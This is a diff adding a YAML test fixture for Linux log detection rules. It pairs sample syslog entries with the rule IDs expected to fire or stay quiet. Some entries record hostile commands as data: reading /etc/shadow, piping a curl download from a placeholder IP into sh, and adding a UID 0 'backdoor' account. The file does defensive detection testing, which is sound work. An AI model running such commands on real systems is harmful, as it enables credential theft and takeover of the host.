@@ -1,0 +1,27 @@
+# Copyright (c) 2026 Adekunle Akeju. All rights reserved except as licensed.
+# Akeju Detection Lab, created by Adekunle Akeju. SPDX-License-Identifier: AGPL-3.0-or-later
+- name: sudo reads the password hash file
+  expect: "100100"
+  lines: ["Nov  8 10:00:01 host sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"]
+- name: ordinary sudo command is not flagged
+  reject: ["100100", "100101", "100103"]
+  lines: ["Nov  8 10:00:01 host sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/ls /tmp"]
+- name: sudoers edit
+  expect: "100101"
+  lines: ["Nov  8 10:00:01 host sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/sbin/visudo"]
+- name: second root account
+  expect: "100102"
+  lines: ["Nov  8 10:00:01 host useradd[1234]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/0"]
+- name: normal new account is not flagged
+  reject: ["100102"]
+  lines: ["Nov  8 10:00:01 host useradd[1234]: new user: name=alice, UID=1001, GID=1001, home=/home/alice, shell=/bin/bash, from=/dev/pts/0"]
+- name: download piped to shell
+  expect: "100103"
+  lines: ["Nov  8 10:00:01 host sudo:    alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/bash -c curl -s http://198.51.100.7/x | sh"]
+- name: SSH password guessing
+  expect: "100104"
+  repeat: 10
+  lines: ["Nov  8 10:00:01 host sshd[1001]: Failed password for invalid user admin from 203.0.113.50 port 50022 ssh2"]
+- name: one failed SSH login is not flagged
+  reject: ["100104"]
+  lines: ["Nov  8 10:00:01 host sshd[1001]: Failed password for invalid user admin from 203.0.113.51 port 50022 ssh2"]
